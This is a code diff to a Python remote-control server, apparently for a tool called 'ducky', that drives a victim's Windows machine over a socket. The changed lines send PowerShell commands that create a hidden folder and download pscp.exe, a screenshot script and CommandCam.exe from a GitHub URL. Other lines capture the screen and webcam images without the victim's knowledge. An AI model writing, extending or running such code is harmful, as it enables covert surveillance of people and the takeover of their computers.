@@ -113,10 +113,15 @@ conn.send("$env:OS\n".encode())
 operating_system = conn.recv(1024).decode().split("\n")[0]
 print("Operating System:      " + operating_system)
 conn.send("cd $env:userprofile/Documents; rm -r z".encode())
+conn.recv(1024)
 conn.send("mkdir z; attrib +h z; cd z".encode())
+conn.recv(1024)
 conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"".encode())
+conn.recv(1024)
 conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/screenshot.ps1\" \"$env:userprofile/Documents/z/screenshot.ps1\"".encode())
+conn.recv(1024)
 conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/CommandCam.exe\" \"$env:userprofile/Documents/z/CommandCam.exe\"".encode())
+conn.recv(1024)
 conn.send(". .\screenshot.ps1".encode())
 conn.recv(1024)
 conn.send("cd $env:userprofile".encode())
@@ -323,9 +328,10 @@ while not stop:
             options = [x for x in ducky_command.split(" ")[1:] if x]
             commands = []
             if len(options) > 0:
-                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/image.png\" /devnum " + options[0])
+                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/webcam.png\" /devnum " + options[0])
             else:
-                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/image.png\"")
+                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/webcam.png\"")
+            stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
